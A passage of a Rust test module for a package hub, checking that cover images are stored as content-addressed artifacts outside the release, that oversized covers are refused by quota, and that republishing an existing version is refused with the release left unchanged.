                    "apiVersion": "zebflow.com/v1",
                    "kind": "Pipeline",
                    "metadata": {"name": "calc"},
                    "spec": {
                        "id": "calc",
                        "description": label,
                        "entry_nodes": [],
                        "nodes": [],
                        "edges": []
                    }
                })
                .to_string(),
            )
            .expect("pipeline");
    }

    fn publish_calc_tools(
        platform: &crate::platform::services::PlatformService,
        version: &str,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        platform.hub.publish_asset(
            "superadmin",
            "default",
            "superadmin",
            "calc-studio",
            "",
            "",
            "",
            "superadmin",
            "default",
            "pipeline_with_dependencies",
            "pipelines/calc.zf.json",
            "calc-tools",
            version,
            "Calculator Tools",
            "Reusable calculator pipeline.",
            "",
            "public",
            Default::default(),
            vec!["math".to_string()],
        )
    }

    /// Publishes with a cover image supplied the way the publish API supplies
    /// one: a path into the project's own file store.
    fn publish_calc_tools_with_cover(
        platform: &crate::platform::services::PlatformService,
        version: &str,
        image_file_path: &str,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        platform.hub.publish_asset(
            "superadmin",
            "default",
            "superadmin",
            "calc-studio",
            "",
            "",
            "",
            "superadmin",
            "default",
            "pipeline_with_dependencies",
            "pipelines/calc.zf.json",
            "calc-tools",
            version,
            "Calculator Tools",
            "Reusable calculator pipeline.",
            image_file_path,
            "public",
            Default::default(),
            vec!["math".to_string()],
        )
    }

    /// Writes a PNG into the project's file store and returns its path.
    fn write_cover_source(root: &tempfile::TempDir, width: u32, height: u32) -> String {
        let dir = root
            .path()
            .join("users")
            .join("superadmin")
            .join("default")
            .join("files")
            .join("images");
        std::fs::create_dir_all(&dir).expect("image dir");
        let mut png = Vec::new();
        image::DynamicImage::ImageRgba8(image::ImageBuffer::from_fn(width, height, |x, y| {
            image::Rgba([(x % 256) as u8, (y % 256) as u8, 160, 255])
        }))
        .write_to(&mut Cursor::new(&mut png), ImageFormat::Png)
        .expect("png");
        std::fs::write(dir.join("cover.png"), png).expect("write cover");
        "images/cover.png".to_string()
    }

    /// A cover is presentation, so it is stored beside the release rather than
    /// inside it: the release document names no image at all, and the bytes are
    /// reached through the content-addressed artifact store.
    #[test]
    fn a_cover_is_stored_as_an_artifact_and_never_enters_the_release() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let image_file_path = write_cover_source(&root, 64, 36);

        let (package, version) =
            publish_calc_tools_with_cover(&platform, "1.0.0", &image_file_path)
                .expect("publish with a cover");

        // The release document: no presentation of any kind.
        let release = std::fs::read(root.path().join(&version.artifact_rel_path))
            .expect("release document bytes");
        let spec = decode_hub_package(&release).expect("release decodes").spec;
        let spec_value = serde_json::to_value(&spec).expect("spec value");
        let spec_object = spec_value.as_object().expect("spec object");
        for field in ["media", "gallery", "image_url", "description_md", "summary"] {
            assert!(
                !spec_object.contains_key(field),
                "spec.{field} must not be in the release"
            );
        }
        assert!(
            !String::from_utf8_lossy(&release).contains("RIFF"),
            "no WebP bytes reached the document an installer parses"
        );

        // The mutable side names the bytes by digest.
        let cover = package.media.first().expect("a cover is recorded");
        assert_eq!(cover.name, "cover.webp");
        assert_eq!(cover.role, "cover");
        assert_eq!(cover.content_type, "image/webp");
        assert_eq!(cover.artifact_sha256.len(), 64);
        assert_eq!(
            package.image_url,
            "/api/hub/remote/assets/calc-studio.calc-tools/media/cover.webp"
        );
        assert_eq!(
            package
                .gallery
                .cover
                .as_ref()
                .map(|item| item.media_name.as_str()),
            Some("cover.webp")
        );

        // Those bytes are in the shared artifact store, under their digest.
        let stored = root
            .path()
            .join("services")
            .join(DEFAULT_HUB_SERVICE_INSTANCE_ID)
            .join("artifacts")
            .join(&cover.artifact_sha256);
        assert!(stored.is_file(), "the cover is stored content-addressed");
        let stored_bytes = std::fs::read(&stored).expect("stored cover bytes");
        assert_eq!(sha256_hex(&stored_bytes), cover.artifact_sha256);
        assert_eq!(stored_bytes.len(), cover.size_bytes);

        // Serving the cover resolves it from the store, not from a release.
        let (served_package, served_media, served_bytes) = platform
            .hub
            .get_latest_asset_media("calc-studio.calc-tools", "cover.webp")
            .expect("cover resolves");
        assert_eq!(served_package.package_id, "calc-studio.calc-tools");
        assert_eq!(served_media.artifact_sha256, cover.artifact_sha256);
        assert_eq!(served_bytes, stored_bytes);

        // A second release of the same package does not re-store the cover: the
        // store is content-addressed, so one image costs one file.
        publish_calc_tools_with_cover(&platform, "1.0.1", &image_file_path)
            .expect("second version publishes");
        let artifact_files = std::fs::read_dir(
            root.path()
                .join("services")
                .join(DEFAULT_HUB_SERVICE_INSTANCE_ID)
                .join("artifacts"),
        )
        .expect("artifact dir")
        .count();
        assert_eq!(artifact_files, 1, "identical bytes are stored once");
    }

    /// The quota is checked against the converted WebP, before anything is
    /// stored, so an oversized cover cannot leave a file behind.
    #[test]
    fn an_oversized_cover_is_refused_before_it_is_stored() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        platform
            .hub
            .upsert_publisher(
                "superadmin",
                "default",
                "calc-studio",
                "Calc Studio",
                "https://publishers.example/calc-studio",
                "publishers@example.com",
                "",
                "",
                "",
                true,
                true,
                true,
                true,
                20,
                10 * 1024 * 1024,
                8,
                // One byte of headroom: any real cover exceeds it.
                1,
            )
            .expect("publisher with a tiny image quota");
        let image_file_path = write_cover_source(&root, 512, 288);

        let error = publish_calc_tools_with_cover(&platform, "1.0.0", &image_file_path)
            .expect_err("the cover is refused");

        assert_eq!(error.code, "HUB_PUBLISHER_QUOTA_EXCEEDED");
        assert!(
            !root
                .path()
                .join("services")
                .join(DEFAULT_HUB_SERVICE_INSTANCE_ID)
                .join("artifacts")
                .exists(),
            "nothing is stored for a refused cover"
        );
    }

    #[test]
    fn publishing_a_new_package_version_records_the_release_and_its_artifact() {
        let (root, platform) = hub_publish_fixture("Calculator One");

        let (package, version) = publish_calc_tools(&platform, "1.0.0").expect("first publish");

        assert_eq!(package.package_id, "calc-studio.calc-tools");
        assert_eq!(version.version, "1.0.0");
        let stored = platform
            .hub
            .hub_data
            .get_hub_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("version row is stored");
        assert_eq!(stored.artifact_sha256, version.artifact_sha256);
        let artifact = root.path().join(&version.artifact_rel_path);
        assert!(artifact.exists(), "the artifact file is written");
        assert_eq!(
            sha256_hex(&std::fs::read(&artifact).expect("artifact bytes")),
            version.artifact_sha256,
            "the recorded digest names the stored bytes"
        );
        // A different version of the same package is a new release, not a
        // republish, and stays allowed.
        publish_calc_tools(&platform, "1.0.1").expect("second version publishes");
    }

    #[test]
    fn republishing_a_package_version_is_refused_and_leaves_the_release_untouched() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let (_, first) = publish_calc_tools(&platform, "1.0.0").expect("first publish");
        let artifact = root.path().join(&first.artifact_rel_path);
        let bytes_before = std::fs::read(&artifact).expect("artifact bytes");

        // Change the source so a republish that slipped through would produce
        // different bytes and a different digest — exactly the drift that turns
        // a `zeb.lock` pin into a false tampered-dependency report.
        write_publish_source(&platform, "Calculator Two");
        let error = publish_calc_tools(&platform, "1.0.0").expect_err("republish is refused");

        assert_eq!(error.code, "HUB_VERSION_EXISTS");
        assert!(
            error.message.contains("calc-studio.calc-tools@1.0.0"),
            "the message names the release: {}",
            error.message
        );
        assert!(
            error.message.contains("bump the version"),
            "the message tells the publisher what to do instead: {}",
            error.message
        );

        let stored = platform
            .hub
            .hub_data
            .get_hub_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("the original row survives");
        assert_eq!(stored.artifact_sha256, first.artifact_sha256);
        assert_eq!(stored.artifact_rel_path, first.artifact_rel_path);
        assert_eq!(stored.manifest, first.manifest);
        assert_eq!(
            stored.created_at, first.created_at,
            "a refused republish does not rewrite when the release was created"
        );
        assert_eq!(
            std::fs::read(&artifact).expect("artifact bytes"),
            bytes_before,
            "the stored artifact keeps the bytes the digest names"
        );
        assert_eq!(
            platform
                .hub
                .list_asset_versions("calc-studio.calc-tools")
                .expect("versions")
                .len(),
            1,
            "the refusal writes no second row"
        );
    }

    #[test]
    fn remote_publishing_an_existing_package_version_is_refused() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let (_, first) = publish_calc_tools(&platform, "1.0.0").expect("first publish");
        let artifact = root.path().join(&first.artifact_rel_path);
        let bytes_before = std::fs::read(&artifact).expect("artifact bytes");
        let (token, _secret) = platform
            .hub
            .create_token(
                "superadmin",
                "default",
                &crate::platform::model::CreateHubTokenRequest {
                    publisher_id: "calc-studio".to_string(),
                    title: "Publish token".to_string(),
                    scopes: vec!["hub:publish".to_string()],
                    expires_at: None,
                },
            )
            .expect("publisher token");

        let error = platform
            .hub
            .import_remote_asset(
                "superadmin",
                "default",
                &token,
                &RemoteHubPublishRequest {
                    package_id: "calc-tools".to_string(),
                    version: "1.0.0".to_string(),
                    title: "Remote overwrite".to_string(),
                    description: "Should never land.".to_string(),
                    summary: String::new(),
                    description_md: String::new(),
                    media: Vec::new(),
                    gallery: HubAssetGallery::default(),
                    visibility: "public".to_string(),
                    tags: Vec::new(),
                    source_owner: "superadmin".to_string(),
                    source_project: "default".to_string(),
                    source_kind: "pipeline_with_dependencies".to_string(),
                    source_ref: "pipelines/calc.zf.json".to_string(),
                    artifact: serde_json::json!({
                        "apiVersion": "zebflow.com/v1",
                        "kind": "HubPackage",
                        "metadata": {"name": "calc-studio.calc-tools", "version": "1.0.0"},
                        "spec": {
                            "asset_kind": "pipeline_bundle",
                            "title": "Remote overwrite",
                            "description": "Should never land.",
                            "files": [
                                {
                                    "rel_path": "pipelines/calc.zf.json",
                                    "kind": "pipeline",
                                    "size_bytes": 2,
                                    "reason": "package",
                                    "content": "{}"
                                }
                            ]
                        }
                    }),
                },
            )
            .expect_err("remote republish is refused");

        assert_eq!(error.code, "HUB_VERSION_EXISTS");
        let stored = platform
            .hub
            .hub_data
            .get_hub_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("the original row survives");
        assert_eq!(stored.artifact_sha256, first.artifact_sha256);
        assert_eq!(stored.created_at, first.created_at);
        assert_eq!(
            std::fs::read(&artifact).expect("artifact bytes"),
            bytes_before
        );
    }

    #[test]
    fn hub_version_created_at_survives_a_row_rewrite() {
        // The durable guarantee behind release immutability: even a rewrite
        // that reaches the store cannot move when the release was created.
        let (_root, platform) = hub_publish_fixture("Calculator One");
        let (_, first) = publish_calc_tools(&platform, "1.0.0").expect("first publish");

        let mut rewritten = first.clone();
        rewritten.created_at = first.created_at + 86_400;
        rewritten.artifact_sha256 = "0".repeat(64);
        platform
            .hub
            .hub_data
            .put_hub_asset_version(&rewritten)
            .expect("row rewrite");

        let stored = platform
            .hub
            .hub_data
            .get_hub_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("version row");
        assert_eq!(
            stored.created_at, first.created_at,
            "created_at is preserved for the life of a version"
        );
    }
}
